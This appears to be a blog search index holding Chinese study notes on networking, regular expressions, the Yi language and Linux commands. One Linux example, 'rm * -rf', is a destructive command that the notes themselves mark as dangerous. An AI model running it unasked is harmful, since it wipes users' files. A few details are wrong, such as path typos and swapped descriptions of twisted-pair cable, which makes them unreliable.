3.2.3 PPP协议的工作状态 当用户拨号接入 ISP 时，路由器的调制解调器对拨号做出确认，并建立一条物理连接。 PC 机向路由器发送一系列的 LCP 分组（封装成多个 PPP 帧）。 这些分组及其响应选择一些 PPP 参数，和进行网络层配置，NCP 给新接入的 PC机分配一个临时的 IP 地址，使 PC 机成为因特网上的一个主机。 通信完毕时，NCP 释放网络层连接，收回原来分配出去的 IP 地址。接着，LCP 释放数据链路层连接。最后释放的是物理层的连接。 . . 3.3 使用广播信道的数据链路层(局域网) 3.3.1 局域网的数据链路层 局域网最主要的特点是：网络为一个单位所拥有，且地理范围和站点数目均有限。 局域网具有如下的一些主要优点： 具有广播功能，从一个站点可很方便地访问全网。局域网上的主机可共享连接在局域网上的各种硬件和软件资源。 便于系统的扩展和逐渐地演变，各设备的位置可灵活调整和改变。 提高了系统的可靠性、可用性和残存性。 . . 媒体共享技术 静态划分信道 频分复用 时分复用 波分复用 码分复用 动态媒体接入控制（多点接入） 随机接入 受控接入 ，如多点线路探询(polling)，或轮询。","categories":[{"name":"计算机网络原理","slug":"计算机网络原理","permalink":"https://xiaowuyoucy.github.io/categories/计算机网络原理/"}],"tags":[]},{"title":"正则表达式","slug":"yyy0002正则表达式","date":"2021-03-29T08:23:07.000Z","updated":"2021-03-29T15:08:59.457Z","comments":true,"path":"2021/03/29/yyy0002正则表达式/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/03/29/yyy0002正则表达式/","excerpt":"","text":"正则表达式 点号应用之简单的数据提取 利用点匹配我们想要的数据并提取出来可以匹配任何一个单字符除换行符外 1个点号只能匹配字符,如123456789abcde… .等,必须为半角的如果想要匹配全半数字,字母，或汉字,就必须要2个点号 星号正则的认识与应用 *星号表示之前的元素出现任意次数或0次 比如: 4.*8我们来看一下他是什么意思，星号出现在点号的后面，这代表点号有出现也行，没有出现也行: 打个比方，他可以匹配48、41238、412345678、4012345670123458 问号和加号的认识与应用 连字符和范围描述符的认识与应用 在学习&quot;-&quot;连字符前，我们先来认识一个强大的符号: [ ]， 这个[ ]所括的内容，可以不按顺序进行匹配。[] 范围描述符 范围描述符。如: [a-z]表示从a到z之间的任意一个。 - 连字符 A一般都与&quot;[]”起使用，只有连字符在字符组内部 时，并且出现在两个字符之间时，才能表示字符的范围;如果出现在字符组的开头，则只能表示连字符本身 例如: [0-9]匹配任意0到9的数字 [a-z]匹配所有小写字母 [A-Z]匹配所有大写字母 当然，你可以把它们混在一起写成[a-z0-9]、[0-9a-zA-z]的样 子都可以下面我们举2个例子就明白了 必从一个网页源码中，区分出数字并提取出来 脱字符^和美元符$的认识与应用 排除:[^1-9]匹配除了1到9的数字,其他的都可以匹配 转义符\\的认识与应用 \\转义符作用:把正 则的元字符转换成元字符本身 如果需要匹配的某个字符本身就是元字符(如:.?*+) ，正则表达式将如何处理呢? 比如:我想要检索互联网的主机名，也就是我们说的网址,如: www.23 .com我们的正则语句要怎么写呢? 想的快的会员就会说，我直接就用www.23.com来匹配点号可以匹配任何字符包括点号本身，当然， 这样是可以匹配到。 但是，如果有www123.com www223. com它们同样也会被匹配出来，唯一的解决办法就是把点号用转义符转换成他自身。 字符组简记法 大括号与选择符的认识与应用 子表达式的认识与应用 贪婪和懒惰的匹配 通配符匹配规则： * ：任意数量的字符 ？：任何单个字符 正则 匹配规则： * 前面元素出现0次以上 . 匹配任何单个字符 ? 前面元素出现0次或1次 + 前面元素出现1次以上 ^ 表示开头。 $ 表示结尾。 .* 表示0个以上的任意字符。 [ ] 范围描述符。[a-z]表示从a到z之间的任意一个。 \\w 英文字母和数字。即[0-9 A-Z a-z]。 \\W 非英文字母和数字 \\s 空字符，即[\\t\\n\\r\\f]。 \\S 非空字符。 \\d 数字，即[0-9]。 \\D 非数字。 \\b 词边界字符（在范围描述符外部时） \\B 非词边界字符 \\b 退格符（0x08）（在范围描述符内部时） {m,n} 前面元素最少出现m次,最多出现n次 | 选择 ( ) 群组 其他字符 该字符本身","categories":[{"name":"易语言","slug":"易语言","permalink":"https://xiaowuyoucy.github.io/categories/易语言/"}],"tags":[]},{"title":"数据类型","slug":"yyy0001数据类型","date":"2021-03-29T07:07:49.000Z","updated":"2021-03-29T08:22:32.860Z","comments":true,"path":"2021/03/29/yyy0001数据类型/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/03/29/yyy0001数据类型/","excerpt":"","text":"数据类型 什么是变量的数据类型呢?实际就是指变量内所存储的数据的类型。 下面我们来讲讲变量内所能存储的基本数据类型。 1.字节型。 可容纳0到255之间的数值。 2.短整数型。 可容纳-32,768到32,767之间的数值，尺寸为2个字节。 3.整数型。 可容纳-2,147 ,483,648到2,147,483,647之间的数值，尺寸为4个字节。 4.长整数型。 可容纳-9,223,372,036,854,775,808到 9,223,372,036,854,775,807之间的数值，尺寸为8个字节。 5.小数型。 可容纳3.4E +/- 38 (7位小数)之间的数值，尺寸为4个字节。 6.双精度小数型。 可容纳1.7E +/- 308 (15位小数)之间的数值，尺寸为8个字节。 7.逻辑型。 值只可能为“真&quot;或“假”，尺寸为2个字节。“真&quot;和“假&quot;为系统预定义常量，其对应的英文常量名称为“true&quot;和false&quot;. 8.日期时间型。 用作记录日期及时间，尺寸为8个字节。 9.文本型。 用作记录一段文本，文本由以字节0结束的一系列字符组成。 10.字节集。 用作记录一段字节型数据。 字节集与字节数组之间可以互相转换，在程序中允许使用字节数组的地方也可以使用字节集，或者相反。字节数组的使用方法，譬如用中括号对(“[]&quot;)加索引数值引用字节成员，使用数组型数值数据进行赋值等等，都可以被字节集所使用。两者之间唯一的不同是字节集可以变长，因此可把字节集看作可变长的字节数组。 11.子程序指针。 用作指向一个子程序，尺寸为4个字节。 在以上的基本数据类型中，字节型、短整数型、整数型、长整数型、小数型、双精度小数型被统称为“数值型”，它们之间可以任意转换。不过编程需要注意转换可能带来的精度丢失。譬如:将整数257转换为字节后的结果为1，这是因为值257超出了字节型数据的最大上限255,从而产生了溢出。查看变量所可以使用的数据类型，在定义变量中双击类型就可以查看所支持的所有数据类型。 创建变量 局部变量 快捷键: ctrl + L 子程序内有效 全局变量 快捷键:ctrl +G 整个程序有效 程序集变量 点击程序集1按下回车键 整个程序集有效 变量可以先使用后声明 易语言规定用[]代表日期类型数据 [年-月-日 时-分-秒] [年:月:日 时:分:秒] [2020-1-1 11-11-22] [2020:1:1 11:11:22] 静态变量和非静态变量的区别 静态变量 经过第一次初始化之后,后面就不用初始化了 子程序结束,变量不释放 非静态变量 每次都会初始化 子程序结束,变量释放","categories":[{"name":"易语言","slug":"易语言","permalink":"https://xiaowuyoucy.github.io/categories/易语言/"}],"tags":[]},{"title":"介绍Android系统的发展历史和发行版本","slug":"介绍Android系统的发展历史和发行版本","date":"2021-03-28T16:11:26.000Z","updated":"2021-03-28T16:11:53.533Z","comments":true,"path":"2021/03/29/介绍Android系统的发展历史和发行版本/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/03/29/介绍Android系统的发展历史和发行版本/","excerpt":"","text":"","categories":[{"name":"Android","slug":"Android","permalink":"https://xiaowuyoucy.github.io/categories/Android/"}],"tags":[]},{"title":"易语言介绍","slug":"易语言介绍","date":"2021-03-28T16:09:38.000Z","updated":"2021-03-29T06:39:47.350Z","comments":true,"path":"2021/03/29/易语言介绍/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/03/29/易语言介绍/","excerpt":"","text":"官方网站 http://www.dywt.com.cn/","categories":[{"name":"易语言","slug":"易语言","permalink":"https://xiaowuyoucy.github.io/categories/易语言/"}],"tags":[]},{"title":"第二章 物理层","slug":"计算机网络原理笔记-第二章-物理层","date":"2021-01-10T08:53:04.000Z","updated":"2021-01-14T07:41:11.865Z","comments":true,"path":"2021/01/10/计算机网络原理笔记-第二章-物理层/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/01/10/计算机网络原理笔记-第二章-物理层/","excerpt":"","text":"计算机网络原理 第二章 物理层 2.1 物理层的基本概念 2.2 数据通信的基础知识 相关术语 有关信道的几个基本概念 2.3 物理层下面的传输媒体 2.4 信道复用技术 2.5 数字传输系统 2.6 宽带接入技术 2.1 物理层的基本概念 物理层解决如何在连接各种计算机传输媒体上传输bit流，注意，不是指用什么传输媒体（介质） 物理层主要任务：确定传输媒体接口的一些特性：（为了统一规划，标准化，各个厂商生产一致，可以通用） 机械特性：接口形状 大小 引线数目 网线内有几根线 电气特性：例如规定电压范围 功能特性：例如规定-5V表示0 +5V表示1（电压信号代表数字信号） 过程特性：（规程特性）规定建立连接时各个部件的工作步骤 2.2 数据通信的基础知识 数据通信模型（图） 相关术语 通信的目的是传送消息 数据（data）：运送消息的实体 信号（signal）：数据的电气或电磁表现 –模拟信号：代表消息的参数取值连续（如电压高低电平代表01数据） –数字信号：代表消息的参数取值离散 码元（code）：在使用时间域的波形表示数字信号时，则代表不同 离散数值的基本波形就称为码元 在数字通信中常常用时间间隔相同的符号来表示一个二进制数字，这样的时间间隔内的信号称为二进制码元，而这个间隔被称为码元长度，1码元可以携带n bit的信息量 解释： 如果信号一共用2种可能，那么1码元代表1bit信息（只有高低电平） 如果信号一共用4种可能，那么1码元代表2bit信息，00 01 10 11，码元有四种可能，一码元代表2bit …… 如果信号一共用2的n次方种可能，那么1码元代表nbit信息。 有关信道的几个基本概念 信道一般表示向一个方向传送的信息的媒体。所以咱们说平常的信息线路往往包含一条发送信息的信道和一条接受信息的信道。 单向通信（单工通信）–只能发送或只能接收 例子：电视塔发送电视信号，但是电视无法向电视塔发送信号 双向交替通信（半双工通信）–双方可以收发，但是不能同时发送或同时接收 双向同时通信（全双工通信）–通信的双方可以同时发送和接收消息 例子：打电话 计算机通信大多数是半双工和全双工通信 基带信号（baseband）和带通信号（band pass） 前提：信号是会衰减的，比如人说话，当距离较远之后，声音就会听不到。 基带信号（baseband）：来自信息源的信号。 带通信号（band pass）：把基带信息经过载波调制后的信号（载波调制就是把信号的频率搬到较高的频段，以便传输） 因此，如果传输距离短，信息衰减可以接受，那就直接使用基带信号，如果距离长，信号衰减大，那就得通过调制将基带信号转换为带通信号，以减小衰减，接收方收到后再进行解调，分析成基带信号进行解读。 几种基本调制方法： 调幅 调频 调相 具体见图： （数字信号的）编码格式： 单极性不归零码 双极性不归零码 单极性归零码 双极性归零码 归零码：一次信号结尾始终为0电压 不归零码：一次信号结尾不需要归零 单极性：只有正向和0电压 双极性：有正负电压 曼彻斯特编码：低电平跳高电平代表0 高电平条低电平代表1，可以代表没有数据传输（用电平变化代表数据传输） 差分曼彻斯特编码：0和1没有固定高低电平，后面的信号是几取决于前面的信号 信道极限容量：信号波形在实际信道传输时，会受到带宽受限、噪声、干扰等引起失真。 奈氏准则：在理想条件下，为了避免码间串扰（码元太短，无法识别高低电平），码元传输速率是有上限的（上一章带宽可以无限增加吗例子） 信噪比：带宽受阻且有高斯白噪声干扰的信道的情况下，信道的极限无差错信息传输速率信道的极限信息传输速率C的计算公式：（香农公式） C = Wlog2(1+S/N) b/s (log2是log以2为底) W：信道带宽（单位Hz） S：信道内所传信号的平均功率 N：信道内部高斯噪声功率 香农公式的结论： 1信道的带宽或信道的信噪比(S/N)越大，信息极限传输速率越高，若W或S/N没有上限，则C没有上限（实际不可能） 2只要信息传输速率低于信道极限信息传输速率，则一定可以找到方法确保数据的无差错传输 实际上信道所能达到的速率比香农公式计算出的低不少 例子：每分钟说200字，外面有噪声，降低说话速度，来确保收听者听到 又例如：无线网的衰减：路由器和计算机在相同房间，计算机速率150M，计算机搬到隔壁，速率只剩下100M，因为隔了一道墙，要确保可靠传输就要降低速率，墙可以理解为噪声。 2.3 物理层下面的传输媒体 导向传输媒体：电磁波沿着固体介质传播 双绞线 –屏蔽双绞线STP（铜线绞在一起，避免电流相互作用，减少干扰） –无屏蔽双绞线UTP（比上面多了一层绝缘层，避免外界干扰） 同轴电缆 （结构和有线电视的电线一样） –50欧姆同轴电缆用于数字传输，多用于基带传输，也叫基带同轴电缆 –75欧姆同轴电缆用于模拟传输，即宽带同轴电缆 光缆 单模光纤 多模光纤 非导向传输媒体（无线传输）：无线传输所使用的频段很广。 短波通信主要是靠电离层的反射，但短波信道的通信质量较差。 微波在空间主要是直线传播。 地面微波接力通信 卫星通信 2.4 信道复用技术 目的：多用户同时传输，不会相互影响。提高信道利用率 频分复用 FDM(Frequency Division Multiplexing) 用户在分配到一定的频带后，在通信过程中自始至终都占用这个频带。 频分复用的所有用户在同样的时间占用不同的带宽资源（请注意，这里的“带宽”是频率带宽而不是数据的发送速率）。 解释：特定的用户使用特定的频率波段，传输时采用不同频率的波段进行调制和解调，已达到区分其他数据的目的 时分复用TDM(Time Division Multiplexing) 时分复用则是将时间划分为一段段等长的时分复用帧（TDM 帧）。每一个时分复用的用户在每一个 TDM 帧中占用固定序号的时隙。 每一个用户所占用的时隙是周期性地出现（其周期就是 TDM 帧的长度）。 TDM 信号也称为等时(isochronous)信号。 时分复用的所有用户是在不同的时间占用同样的频带宽度。 时分复用可能会造成线路资源的浪费 ： 使用时分复用系统传送计算机数据时，由于计算机数据的突发性质，用户对分配到的子信道的利用率一般是不高的。 统计时分复用 STDM(Statistic TDM) 与时分复用类似，只不过每次发送时标记是哪个用户发出的，解析时按标记解析。可以避免线路资源的浪费 波分复用 WDM(Wavelength Division Multiplexing) 波分复用就是光的频分复用。 码分复用 CDM(Code Division Multiplexing) 常用的名词是码分多址 CDMA (Code Division Multiple Access)。 各用户使用经过特殊挑选的不同码型，因此彼此不会造成干扰。这种系统发送的信号有很强的抗干扰能力，其频谱类似于白噪声，不易被敌人发现。 每一个比特时间划分为 m 个短的间隔，称为码片(chip)。 2.5 数字传输系统 脉码调制 PCM 体制：最初是为了在电话局之间的中继线上传送多路的电话。 由于历史上的原因，PCM 有两个互不兼容的国际标准，即北美的 24 路 PCM（简称为 T1）和欧洲的 30 路 PCM（简称为 E1）。我国采用的是欧洲的 E1 标准。 E1 的速率是 2.048 Mb/s，而 T1 的速率是 1.544 Mb/s。当需要有更高的数据率时，可采用复用的方法。 E1取样8000次/s 每个码元代表8位bit E1 采用时分复用技术 32路同时传输 8800032 = 2.048Mb/s T1只有24路同时传播，且有控制信号 8800024+8K=1.544Mb/s(8K表示控制信号) 2.6 宽带接入技术 ADSL (Asymmetric Digital Subscriber Line)：非对称数字用户线（就是通过电话线上网） 用数字技术对现有的模拟电话用户线进行改造，使它能够承载宽带业务。把 0~4 kHz 低端频谱留给传统电话使用，而把原来没有被利用的高端频谱留给用户上网使用。 ADSL实现原理采用DMT技术 DMT 调制技术采用频分复用的方法，把 40 kHz 以上一直到 1.1 MHz 的高端频谱划分为许多的子信道，其中 25 个子信道用于上行信道，而 249 个子信道用于下行信道。每个子信道占据 4 kHz 带宽（严格讲是 4.3125 kHz），并使用不同的载波（即不同的音调）进行数字调制。这种做法相当于在一对用户线上使用许多小的调制解调器并行地传送数据。 ADSL上网图解： 光纤同轴混合网 HFC (Hybrid Fiber Coax)（就是利用有线电视线路上网） HFC 网是在目前覆盖面很广的有线电视网 CATV 的基础上开发的一种居民宽带接入网。HFC 网除可传送 CATV 外，还提供电话、数据和其他宽带交互型业务。现有的 CATV 网是树形拓扑结构的同轴电缆网络，它采用模拟技术的频分复用对电视节目进行单向传输。而 HFC 网则需要对 CATV 网进行改造。 HFC 的主要特点 HFC网的主干线路采用光纤 HFC 网将原 CATV 网中的同轴电缆主干部分改换为光纤，并使用模拟光纤技术。 在模拟光纤中采用光的振幅调制 AM，这比使用数字光纤更为经济。 模拟光纤从头端连接到光纤结点(fiber node)，即光分配结点 ODN (Optical Distribution Node)。在光纤结点光信号被转换为电信号。在光纤结点以下就是同轴电缆 HFC结构示意图","categories":[{"name":"计算机网络原理","slug":"计算机网络原理","permalink":"https://xiaowuyoucy.github.io/categories/计算机网络原理/"}],"tags":[]},{"title":"第一章 概述","slug":"计算机网络原理笔记-第一章-概述","date":"2021-01-10T08:15:21.000Z","updated":"2021-01-13T10:12:33.989Z","comments":true,"path":"2021/01/10/计算机网络原理笔记-第一章-概述/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/01/10/计算机网络原理笔记-第一章-概述/","excerpt":"","text":"第一章 概述 计算机网络基础（韩立刚视频笔记）第一章 概述 第一章（概述） 局域网 广域网 OSI参考模型 OSI架构图 各层间的数据传输 网络排错 OSI网络参考模型和网络安全的例子 计算机网络性能指标 第一章（概述） 局域网 覆盖范围小，自己单位维护，带宽固定（由硬件决定） 100米 带宽小 多台计算机连接到接入层交换机 多台接入层交换机连接到汇聚层交换机 每一层都是一个星型结构 接入层交换机：接入口多 汇聚层交换机：连接各个接入层交换机，端口带宽高 广域网 距离远 花钱买服务 花钱租带宽 ISP（Internet Server Provider）网络服务提供商 自己的机房 对网民提供Internet服务 运营的网站放在运营商服务器机房 运营商直之间只有一条线路连接，所以这条线路会成为通信速率瓶颈，也是为什么我们跨运营商访问网站比较慢的原因 物理地址的作用：数据传输时记录当前物理地址和下次的传输物理地址 IP地址的作用：记录当前IP地址和目标IP地址 OSI参考模型 应用层 能产生流量的程序 表示层 加密 压缩等处理 传输格式（二进制 ASCII码）乱码是表示层问题（开发者处理） 会话层 可以查木马 netstat -n查看链接状态 netstat -nb 查看连接由谁创建 传输层 可靠传输 流量控制 不可靠传输 网络层 选择最佳路径 规划IP地址 数据链路层 标记帧的开始和结束 透明传输 差错校验 交换机速度 物理层 网络设备接口标准 电器（气？）标准 如何在物理链路进行更快的传输（电压 接口数量 接口类型 通信介质：光纤 网线 双绞线） 分层的好处：7层相互独立，某一层变化不会影响其他层（相当于软件开发的耦合性小的意思） 比如在应用程序写入服务器的IP地址是不符合分层的思想的，万一服务器的IP地址修改 应用程序就挂了（IP地址是网络层的内容，应用程序属于应用层） 各层关系：低层向高层提供服务 OSI架构图 各层间的数据传输 数据封装 （途中的五层架构，就是OSI架构图右侧的五层架构） 网络排错 从底层向上排除 1.物理层故障：网络连接状态 查看发送和接收数据包 2.数据链路层故障：MAC地址冲突 ADSL欠费 网速无法协商 计算机连接到错误的VLAN 3.网络层故障：配置了错误的IP 子网掩码 网关，路由器没有配置可达目标的路由 4.应用层故障：（上四层都在这里说）应用程序配置错误（如如浏览器配置了错误的代理） OSI网络参考模型和网络安全的例子 1.物理层安全 一栋大厦是保险公司的，建造时布好网线，使用时10层租给了其他公司，其他公司通过原先布好的网线就可以访问保险公司网络。（别人应该无法私自连接到你的网络，租售10层时 应将网线断开服务器，或配置将网络断开） 2.数据链路层安全 上网时 ADSL 上网账号密码 VLAN划分 交换机绑定固定MAC地址 3.网络层安全 路由器上使用ACL控制数据包流量（指定IP才传输） 防火墙设置 4.应用层安全 开发的应用程序没有漏洞（比如没有SQL注入漏洞等等） 计算机网络性能指标 1.速率 连接在计算机网络上的主机在数字信道上传送数据位数的速率（data rate，bit rate）单位为b/s,kb/s,Mb/s,Gb/s 这就是我们常说的“我家装的100M的带宽”，不过，有些网站测速显示的速率是按字节来表示的，即需要拿100M/8得到网站显示数据 还有交换机的带宽为100M，100M其实是100Mb/s 2.带宽 数据通信中，数字信道所能传输的最高速率，单位为b/s,kb/s,Mb/s,Gb/s 注意，这也是一个速率，只不过是最大速率，和上面的理解几乎一样，多数情况受硬件限制 3.吞吐量 单位时间内通过某个网络数据量（有可能是几条数据链路流量和） 4.时延 也就是我们平时玩游戏说的延时 时延包括 发送时延 传播时延 处理时延 排队时延 发送时延 = 数据块长度（bit）/信道带宽（bit/s）=N s 加带宽是减少发送时延 传播速度由介质介质决定，介质固定，传播速度固定 带宽可以无限增加吗？ 不可以：数据块长度固定，增加带宽意味着发送时间变短，同时数据块在信道中的长度也变短了（波形长度 = 发送时间 * 传播速度），之前说过传播速度由介质决定，一般固定，那么发送时间越短，波形越短，短到一定程度，接收方就无法识别高低电平了 铜线和光纤的对比： 铜线的传播速率其实和光纤的速率接近，那为什么使用光纤呢？因为光纤支持更高的发送速率，光纤使用光信号，即使数据很短，也能解析出高低电平。而铜线使用电信号，波形太短，无法识别高低电平。 5.时延带宽积=传播时延*带宽 6.往返时间（RTT Round-Trip Time） ping出的时间就是往返时间 &gt;2000ms请求超时 7.利用率 最形象的例子是汽车和公路。以汽车类比数据块，以高速公路类比网络光纤。当汽车较少时，利用率较低，但汽车开的很快，延时较低。如果遇到节假日，高速公路塞满了汽车，公路利用率高了，同时延时也高了，因为车已经开不快了，堵车啊。。。 网络模式: 单工模式：只能发或收 电视台 广播 半双工模式: 可以发和收，但不能同时进行 对讲机 全双工模式: 可以同时发和收 互联网 电话 无线网的带宽 由网络强度决定 集线器 物理层 交换机 物理层 数据链路层 路由器 物理层 数据链路层 网络层","categories":[{"name":"计算机网络原理","slug":"计算机网络原理","permalink":"https://xiaowuyoucy.github.io/categories/计算机网络原理/"}],"tags":[]},{"title":"linux1-2","slug":"001linux1-2","date":"2020-11-18T09:24:59.000Z","updated":"2020-11-18T16:29:51.407Z","comments":true,"path":"2020/11/18/001linux1-2/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/11/18/001linux1-2/","excerpt":"","text":"操作系统的作用: 使计算机系统易于使用 有效管理系统资源 方便用户开发、测试和引进新功能 向下封装硬件，向上提供操作接口 linux分为内核版本和发行版本 内核源码网站：www.kernel.org 发行版本就是给系统披上了UI 文件系统: 采用 “路径” + “文件名” linux 采用 ‘’/&quot; 且没有盘符 路径分为: 绝对路径 相对路径 ./表示当前目录 ../表示上一级目录 linux目录结构 / 根目录 /home 家目录 /bin 放工具(可执行文件) /lib 库文件 /usr/include 头文件 文件权限 文件分类 普通文件 - 目录文件 d 设备文件 c字符设备 b块设备 管道文件 链接文件 文件类型 文件所有者 用户组 其他人 - rwx rwx rwx -rwxrwxrwx 查看用户组信息 1cat /ect/gruop 查看用户信息 1cat /ect/passwd 用户名: x : 用户id : 组id 文件目录的x权限代表可进入权限 一般情况下linux/unix只允许文件所有者或超级用户(root)改变文件权限 命令 [-可选参数1] [-可选参数n] []是可选参数 查命令 使用–hellp 查手册 用man命令 1man [选项] 命令名 按q退出 enter下一行 空格下一屏 h列出所有功能键 /字符串 搜索所有该字符串 可以使用方向键操控 以章节方式分类 1代表命令 2代表系统调用 3代表库调用 1man 3 printf //查询printf函数使用说明 按tab键可以补全命令 方向键可以查使用过的命令 history 命令 列出历史命令(连续重复的命令只列举一次) ls 遍历当前目录 ls [-选项] -a 遍历所有子目录与文件 -l 详细显示信息 -h 以人性化方式显示文件大小 使用方式 1234ls -ahlls -als -lll #等价于 ls -l 一个文件夹默认有两个目录,一个是.另一个是.. 分别代表当前目录和上一级目录。 文件类型 权限 硬连接数目 文件所有者 用户组 文件大小 创建日期 文件名/目录 如果是文件夹,硬链接数目代表其下有多少子目录 touch 创建文件 123touch 文件名touch abctouch 文件名1 文件名2 文件名3...文件名n 如果文件存在则修改日期时间为当下时间,否则则创建新文件 ? 代表任意一个字符 [abc] 匹配a、b、c中任意一个字符 [a~z] 匹配a~z中任意一个字符 \\ 转义字符 1234ls ?.cls a.?ls [a~d]*ls [abc].? 输出重定向命令: &gt; 将命令执行结果重定向到一个文件上 1234ls &gt; text.txt #如果文件不存在,则创建.存在则覆盖ls &gt;&gt; a.txt #如果文件不存在,则创建.存在则追加内容,不覆盖set -C #禁止覆盖set +C #解除禁止覆盖 分屏显示:more 12more 文件名more abc 按q退出 空格下一页 h帮助 管道:| 一个命令的输出可以通过管道做为另一个命令输入 输出|输入 123ls | grep std #从ls中搜索std字符ls | more 从切换工作目录 cd Linux所有的目录或文件名大小写敏感 12345678910#切换到当前用户的主目录(/home/用户目录)cd ~ #当前目录cd . #上一级目录cd ..#上一次进入的目录cd -cd 相对路径和绝对路径cd ~/share #等价于cd /home/用户名/share 查看当前路径 pwd 清屏 clear 1clear ctrl+l也可以 创建文件夹 mkdir 1234mkdir 文件名mkdir 123 #创建一个123的文件夹mkdir /home/yc/aaa #指定路径创建一个aa文件夹mkdir -p /home/yc/a/b/c #递归创建 创建者需要有当前文件夹写的权限 删除文件夹 rmdir 12rmdir 文件夹名rmdir aaa 文件夹必须是空的才可以删除 rm 可以删除非空文件夹或文件 -f不提示 -r删除文件夹 -i交互式删除 1234rm 文件rm -r 文件夹rm * -rf #危险操作rm 文件1 文件2 文件3...文件n 建立链接文件 ln 硬链接: 给某个文件拷贝一份,这两个文件独立存在 改变其中一个,另一个也会改变 删除某个硬链接,不会影响另一个文件 只能链接普通文件,不能链接目录 12ln 源文件 链接文件ln 1.txt a.txt #a.txt是硬链接文件 软链接: 类似windows的快捷方式 如果源文件删除,软连接文件没有意义 12ln -s 源文件 链接文件ln -s aaa bbb 和windows快捷方式的区别: 假设有一个软连接目录是aaa,源文件是b,进入aaa路径会显示xx/aaa而不是xx/b,aaa实际上是b的别名,实际进入的是b目录 软链接文件的大小是固定的 gedit 图形化文本编辑 1gedit 文件名 文件存在就打开,不存在就创建一个 查看或合并文本内容 cat 1234cat 文件名cat 文件名1...文件名ncat 文件名1 文件名2 文件名n &gt;&gt; 文件名x1 #追加合并文本内容cat 文件名1 文件名2 文件名n &gt; 文件名x1 #覆盖合并文本内容 文本搜索 grep grep [-选项] '字符串' 文件名 字符串最好用双引号括起来 -v求反 -n显示行号 -i不区分大小写 12grep \"sss\" 1.txtgrep aaa 1.txt -n 正则表达式 ^a代表以a开头 ke$以ke结尾 [1~9]1~9中任意一个 [1~9]aaa[1~9]aaa是固定字符 .a.点代表任意一个字符,a是固定字符 ?和*失效 1ls | grep ^a 查找文件 find ​ find 路径 -name 文件名 find 路径 -size 文件大小 find 路径 -perm 0777 12345678find ./ -size 2M #搜索等于2M的文件find ./ -size +2M #搜索大于2M的文件find ./ -size -2M #搜索小于2M的文件find ./ -size +4k -size -5M #搜索大于4k小于5M的文件find 路径 -perm 0777 #搜索777权限的文件find ./ -name abcfind ./ -name \"*.ssh\"find ./ -name \"[a-z]*\" 拷贝文件 cp cp 源文件或目录 文件名 [-选项] -a保持文件原有属性 -f不提醒 -i交互式复制 -r递归复制目录 -v显示进度 12cp ./a /b -rcp ./1.txt ./a/b 移动文件 mv 用来移动或重命名文件或目录 -f 不提示 -i 交互式移动 -v显示进度 123mv ./a.txt ./b mv ./a.txt ./b.txt #重命名mv ./a / 获取文件类型 file file 文件名 executable 可执行文件 ASCII text 文本文件 编译文件 gcc 源文件 -o 文件名 运行程序 直接输入路径+文件名 1./a.exe 归档管理 tar 打包和解包但不压缩 tar [参数] 打包文件名 源文件 -可以不写 打包 1234tar -cvf 打包名称.tar 源文件c 创建包 v 进度 f 后面是打包名,f放最后tar -cvf aaa.tar * 解包 12345tar -xvf 包名tar -xvf 包名 -C 路径指定路径要加大写C,x代表解包 tar -xvf aaa.tar gzip压缩和解压 1gzip xxx.tar #自动生成一个xxx.tar.gz压缩包 -r代表压缩,一般省略不写 -d代表解压 12gzip -r xxx.tar xxx.tar.gz加了-r xxx.tar.gz要自己写 解压 1gzip -d xxx.tar.gz bzip2 解压/压缩 12bzip2 xxx.tar #压缩bzip2 -d xxx.tar.bz2 #解压 打包压缩 指定路径要加 -C gzip 1tar -czvf xxx.tar.gz *.* bzip2 1tar -cjvf xxx.tar.bz2 *.* 1tar -cjvf xxx.tar.bz2 -C ./my/*.* 解压解包 gzip 1tar -xzvf xxx.tar.gz bzip2 1tar -xjvf xxx.tar.bz2 1tar -xjvf xxx.tar.bz2 -C ./my/ 文件压缩和解压 zip unzip 压缩 zip 12zip -r 压缩文件名-r是必须要加的 解压 unzip 12unzip -d 压缩包名unzip -d ./text.zip 查看命令所在目录 which 12which 命令名which ls who查看最近登录的用户 1who w 查看最近登录的用户,显示ip 1w exit 退出当前用户 1exit 如果是图像界面终端,退出当前终端 如果是使用ssh远程登录,退出登录用户 如果是切换后的登录用户,退出则返回上一个登录账户. su 切换用户 123456su #切换到root用户su root #切换root用户su - #切换root用户,同时切换到/root目录su - root #切换root用户,同时切换到/root目录 -两边都有空格su 普通用户su - 普通用户 sudo 运行普通用户执行一些或全部的root命令的一个工具,减少了root用户的登录和管理时间,提高安全性 需要root权限 添加删除组账号:groupadd groupdel groupadd 新建组账号 groupdel删除组账号 如果有用户属于组了,就不能删组了,把用户移出该组才可以删 groupadd 组名 groupdel组名 12groupadd abcgroupdel abc 修改用户所在组 usermod usermod -g 用户组 用户名 1usermod -g root abc 查看用户组信息 cat /etc/group 查看用户信息 cat /etc/passwd yxc19980620c:x:1000:0:yc:/home/yxc19980620c:/bin/bash 1000代表用户id 0代表用户组id 添加用户 useradd或adduser 添加用户时需要在/home目录下添加一个和新建用户同名的文件夹 useradd和adduser功能完全一样 useradd -d 用户文件夹 用户名 -m useradd -d /home/abc abc -m 12useradd -d 用户文件夹 用户名 -m useradd -d /home/abc abc -m -d代表指定用户文件夹 -m代表如果用户文件夹不存在则新建一个用户文件夹 新建用户并指定用户组 useradd -d 用户文件夹 用户名 -g 用户组 -m 1useradd -d /home/abc abc -g root -m 删除用户 userdel 12userdel 用户名 #不会自动删除用户的主目录userdel 用户名 -r #会同时删除用户的主目录 给用户添加密码 passwd 12passwd 用户名passwd abc 查看用户登录情况 last 1sudo last 修改文件权限 chmod 字母法: chmod 修改权限 文件名 u 用户所有者 g 用户组 o 其他人 123+ 代表加权限- 代表减权限= 赋值权限 12345chmod u+x 1.c #给1.c文件添加所有者x执行权限chmod g-x 1.c #给1.c文件减去所属组x执行权限chmod o=rwx #给1.c文件赋予其他人rwx权限 数字法 123u g o0 0 0第一个数字0 对应着u权限 123456789rwx--- 000 代表没有权限r-- 100 4-w- 010 2--x 001 1rw- 110 6r-x 101 5-wx 011 3rwx 111 7 123chmod 777 1.c #代表1.c的权限是-rwx rwx rwxchmod 444 1.c #代表1.c的权限是-r--r--r-- 文件夹权限说明 目录没有x权限,表示不能进此目录 没有r权限,不能查看文件夹内容 没有w权限,不能新建或删除,修改文件 